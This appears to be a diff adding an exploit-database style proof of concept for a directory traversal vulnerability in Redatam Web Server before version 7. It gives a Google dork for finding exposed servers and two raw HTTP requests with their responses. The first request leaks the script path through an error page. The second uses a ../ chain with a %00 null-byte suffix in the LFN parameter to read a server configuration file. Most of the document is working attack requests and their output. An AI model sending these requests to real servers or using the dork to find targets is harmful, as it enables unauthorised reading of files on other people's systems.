@@ -1,0 +1,90 @@
+# Exploit Title: Redatam Web Server < 7 - Directory Traversal
+# Google Dork: inurl: /redbin/rpwebutilities.exe/
+# Date: 2018-06-18
+# Exploit Author: Berk Dusunur
+# Vendor Homepage: http://redatam.org/redatam/en/index.html
+# Software Link: https://www.cepal.org/en/topics/redatam/download-redatam
+# Version: before V6
+# Tested on: Pardus Windows AppServ
+# CVE : N/A
+
+# Proof of Concept
+# Redatam web server windows server running LFN parameter affected by directory traversal
+# Making a wrong request causes directory leak
+
+# Request
+
+GET /redbin/rpwebutilities.exe/text?LFN=blablabla%00.htm&TYPE=TMP HTTP/1.1
+Host: 192.168.1.104
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+# Response
+
+HTTP/1.1 500 Internal Server Error
+Date: Mon, 18 Jun 2018 10:04:44 GMT
+Server: Apache/2.4.23 (Win32) PHP/5.6.25
+Content:
+Content-Length: 416
+Connection: close
+Content-Type: text/html
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<heading/>
+<body>
+<h1>R+SP WebUtilities Exception</h1>
+<p>Error Number [401]</p>
+<p><b>Error Message</b></p>
+<p>File not found in folder [C:\wamp\apps\redatam\redbin\] - [blablabla]
+
+Script directory /wamp/apps/redatam/redbin/
+
+# Request 2
+
+GET
+/redbin/rpwebutilities.exe/text?LFN=../../../../../../../../../../../../../../../../wamp/apps/redatam/redbin/prt/webservermain.inl%00.htm&TYPE=TMP
+HTTP/1.1
+Host: 192.168.1.104
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+# Response 2
+
+HTTP/1.1 200 OK
+Date: Mon, 18 Jun 2018 10:11:44 GMT
+Server: Apache/2.4.23 (Win32) PHP/5.6.25
+Title:
+../../../../../../../../../../../../../../../../wamp/apps/redatam/redbin/prt/webservermain.inl
+Content:
+Content-Length: 2319
+Connection: close
+Content-Type: text/html; charset=utf-8
+
+[STRUCTURE]
+USERCONTROL=YES
+GROUPALIGN=LEFT
+
+SERVERTIMEOUT=1800
+
+HTMLPATH=RpSite\
+
+PORTALTITLE=CELADE/CEPAL, Nações Unidas
+PORTALSUBTITLE=Procesamiento En-Línea com REDATAM
+
+//PORTALCENTERIMAGE=/redatam/images/LogoRedatam7_520x390.png
+//PORTALBACKGROUNDHEADERIMAGE=
+//PORTALBACKGROUNDINDEXIMAGE=
+//PORTALBACKGROUNDOUTPUTIMAGE=
